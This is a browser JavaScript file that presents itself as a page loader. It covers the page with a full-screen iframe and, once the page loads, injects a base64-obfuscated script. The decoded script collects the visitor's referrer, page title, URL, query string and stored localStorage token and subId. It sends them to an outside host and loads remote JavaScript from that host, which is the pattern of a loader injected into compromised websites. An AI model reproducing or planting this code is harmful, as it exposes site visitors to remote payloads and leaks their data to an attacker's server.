const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    const script = document.createElement('script');
    script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfTUQ4R1gxcFdqTHp5cnlIRic7CiAgICBpZiAoIXdpbmRvdy5fTUQ4R1gxcFdqTHp5cnlIRikgewogICAgICAgIHdpbmRvdy5fTUQ4R1gxcFdqTHp5cnlIRiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vUmZRY012Qk4nLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfRHZMa0I4bm5IR2RKUURHayA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX0R2TGtCOG5uSEdkSlFER2sgIT09ICd1bmRlZmluZWQnICYmIF9EdkxrQjhubkhHZEpRREdrICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9mVEcxTWY4czgybXRjS0hSID0gSlNPTi5wYXJzZShfRHZMa0I4bm5IR2RKUURHayk7CiAgICAgICAgdmFyIF81cUdGTERzeDFjMlpKSDVoID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX2ZURzFNZjhzODJtdGNLSFIuY3JlYXRlZF9hdCArIHdpbmRvdy5fTUQ4R1gxcFdqTHp5cnlIRi50dGwgPCBfNXFHRkxEc3gxYzJaSkg1aCkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX05teXNYZFM0eWtjN0JXYnggPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfTWpKNXN3RjkxY0pmR3hHQiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9GOHlqUzJKbTE0WUY3UXpSID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfRjh5alMySm0xNFlGN1F6UiArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfRjh5alMySm0xNFlGN1F6UiArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9GOHlqUzJKbTE0WUY3UXpSICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9GOHlqUzJKbTE0WUY3UXpSICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfRjh5alMySm0xNFlGN1F6UiArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfRjh5alMySm0xNFlGN1F6UiArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX01EOEdYMXBXakx6eXJ5SEYuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX05teXNYZFM0eWtjN0JXYnggIT09ICd1bmRlZmluZWQnICYmIF9ObXlzWGRTNHlrYzdCV2J4ICYmIHdpbmRvdy5fTUQ4R1gxcFdqTHp5cnlIRi51bmlxdWUpIHsKICAgICAgICBfRjh5alMySm0xNFlGN1F6UiArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9ObXlzWGRTNHlrYzdCV2J4KTsKICAgIH0KICAgIGlmICh0eXBlb2YgX01qSjVzd0Y5MWNKZkd4R0IgIT09ICd1bmRlZmluZWQnICYmIF9Nako1c3dGOTFjSmZHeEdCICYmIHdpbmRvdy5fTUQ4R1gxcFdqTHp5cnlIRi51bmlxdWUpIHsKICAgICAgICBfRjh5alMySm0xNFlGN1F6UiArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX01qSjVzd0Y5MWNKZkd4R0IpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF9GOHlqUzJKbTE0WUY3UXpSICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fTUQ4R1gxcFdqTHp5cnlIRi5SX1BBVEggKyBfRjh5alMySm0xNFlGN1F6UjsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
     document.querySelector("head").appendChild(script);
     setTimeout(toggleLoad, 1000);

  
})
